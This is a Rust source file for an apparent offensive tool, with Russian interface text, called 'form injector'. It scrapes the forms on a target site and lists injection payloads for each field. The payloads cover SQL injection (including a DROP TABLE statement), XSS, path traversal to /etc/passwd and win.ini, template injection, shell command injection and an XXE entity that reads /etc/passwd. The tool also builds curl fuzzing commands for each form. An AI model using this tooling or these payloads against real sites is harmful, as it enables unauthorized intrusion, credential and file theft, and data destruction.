use anyhow::Result;
use scraper::{Html, Selector};
use url::Url;
use crate::ui::{self, color::*};

struct FormField {
    name:    String,
    ftype:   String,
    value:   String,
}

struct Form {
    action: String,
    method: String,
    fields: Vec<FormField>,
}

pub async fn run() -> Result<()> {
    ui::section("form injector — анализ форм и векторы фаззинга");
    println!();

    let target = ui::prompt("target url:");
    if target.is_empty() { ui::err("url обязателен"); return Ok(()); }

    let root = match Url::parse(&target) {
        Ok(u) => u, Err(e) => { ui::err(&format!("{e}")); return Ok(()); }
    };

    println!("  {GRAY}загружаем страницу...{RESET}");

    let client = reqwest::Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
        .timeout(std::time::Duration::from_secs(20))
        .build()?;

    let html = match client.get(&target).send().await {
        Ok(r) => r.text().await.unwrap_or_default(),
        Err(e) => { ui::cursor_up(1); ui::err(&format!("{e}")); return Ok(()); }
    };
    ui::cursor_up(1);

    let doc       = Html::parse_document(&html);
    let form_sel  = Selector::parse("form").unwrap();
    let input_sel = Selector::parse("input,textarea,select").unwrap();

    let mut forms: Vec<Form> = vec![];

    for form_el in doc.select(&form_sel) {
        let action = form_el.value().attr("action").unwrap_or("").to_string();
        let method = form_el.value().attr("method").unwrap_or("GET").to_uppercase();
        let abs_action = root.join(&action).map(|u| u.to_string()).unwrap_or(action);

        let mut fields: Vec<FormField> = vec![];
        for input_el in form_el.select(&input_sel) {
            let name  = input_el.value().attr("name").unwrap_or("").to_string();
            let ftype = input_el.value().attr("type").unwrap_or("text").to_string();
            let val   = input_el.value().attr("value").unwrap_or("").to_string();
            if !name.is_empty() {
                fields.push(FormField { name, ftype, value: val });
            }
        }
        forms.push(Form { action: abs_action, method, fields });
    }

    println!();
    println!("  {DRED}╔══════════════════ {BRED}{BOLD}form injector{RESET}{DRED} ══════════════════╗{RESET}");
    println!("  {DRED}║{RESET}  {GRAY}найдено форм:{RESET}  {BRED}{BOLD}{}{RESET}", forms.len());
    println!("  {DRED}║{RESET}");

    if forms.is_empty() {
        println!("  {DRED}║{RESET}  {GRAY}форм не найдено{RESET}");
    }

    for (idx, form) in forms.iter().enumerate() {
        let form_type = guess_form_type(&form.fields);
        println!("  {DRED}║{RESET}  {BRED}форма #{}{RESET}  {RED}{}{RESET}  {GRAY}[{form_type}]{RESET}", idx+1, form.method);
        println!("  {DRED}║{RESET}  {GRAY}action:{RESET}  {WHITE}{}{RESET}", shorten(&form.action, 58));
        println!("  {DRED}║{RESET}");

        for field in &form.fields {
            let payloads = generate_payloads(&field.name, &field.ftype);
            println!("  {DRED}║{RESET}  {RED}  ◈{RESET}  {WHITE}{:<20}{RESET}  {GRAY}type:{}{RESET}", field.name, field.ftype);
            for (cat, payload) in payloads.iter().take(4) {
                let p = if payload.len() > 46 { format!("{}…", &payload[..45]) } else { payload.clone() };
                println!("  {DRED}║{RESET}       {DRED}{cat:<14}{RESET}  {GRAY}{p}{RESET}");
            }
            println!("  {DRED}║{RESET}");
        }

        // curl command
        let params: Vec<String> = form.fields.iter()
            .map(|f| format!("{}=FUZZ", f.name))
            .collect();
        let data_str = params.join("&");
        let method_flag = if form.method == "POST" { "-X POST -d" } else { "--get -d" };
        println!("  {DRED}║{RESET}  {GRAY}curl:{RESET}");
        println!("  {DRED}║{RESET}  {DRED}curl {method_flag} \"{data_str}\" \\{RESET}");
        println!("  {DRED}║{RESET}  {DRED}       \"{}\"{RESET}", shorten(&form.action, 60));
        println!("  {DRED}║{RESET}");
    }

    println!("  {DRED}╚══════════════════════════════════════════════════════════════╝{RESET}");
    ui::divider();
    Ok(())
}

fn guess_form_type(fields: &[FormField]) -> &'static str {
    let names: Vec<&str> = fields.iter().map(|f| f.name.as_str()).collect();
    let types: Vec<&str> = fields.iter().map(|f| f.ftype.as_str()).collect();
    if types.contains(&"password") { return "login/auth"; }
    if names.iter().any(|n| n.contains("search") || n.contains("query") || n.contains("q")) { return "search"; }
    if names.iter().any(|n| n.contains("email") || n.contains("mail")) { return "contact/subscribe"; }
    if names.iter().any(|n| n.contains("comment") || n.contains("message") || n.contains("body")) { return "comment"; }
    "generic"
}

fn generate_payloads(name: &str, ftype: &str) -> Vec<(String, String)> {
    let mut payloads: Vec<(String, String)> = vec![];

    // SQLi
    payloads.push(("sqli basic".to_string(),    "' OR '1'='1".to_string()));
    payloads.push(("sqli union".to_string(),     "' UNION SELECT NULL--".to_string()));
    payloads.push(("sqli blind".to_string(),     "' AND SLEEP(5)--".to_string()));
    payloads.push(("sqli stacked".to_string(),   "'; DROP TABLE users--".to_string()));

    if ftype != "password" && ftype != "hidden" {
        // XSS
        payloads.push(("xss basic".to_string(),  "<script>alert(1)</script>".to_string()));
        payloads.push(("xss attr".to_string(),   "\" onmouseover=\"alert(1)".to_string()));
        payloads.push(("xss img".to_string(),    "<img src=x onerror=alert(1)>".to_string()));
        // Path traversal
        payloads.push(("traversal".to_string(),  "../../../../etc/passwd".to_string()));
        payloads.push(("traversal win".to_string(), "..\\..\\..\\windows\\win.ini".to_string()));
        // SSTI
        payloads.push(("ssti".to_string(),       "{{7*7}}".to_string()));
        payloads.push(("ssti2".to_string(),       "${7*7}".to_string()));
        // Command injection
        payloads.push(("cmdi".to_string(),       "; id; #".to_string()));
        payloads.push(("cmdi2".to_string(),      "| whoami |".to_string()));
    }

    // XXE (if looks like XML field)
    if name.to_lowercase().contains("xml") || name.to_lowercase().contains("data") {
        payloads.push(("xxe".to_string(), "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>".to_string()));
    }

    payloads
}

fn shorten(s: &str, n: usize) -> String {
    if s.len() > n { format!("{}…", &s[..n-1]) } else { s.to_string() }
}
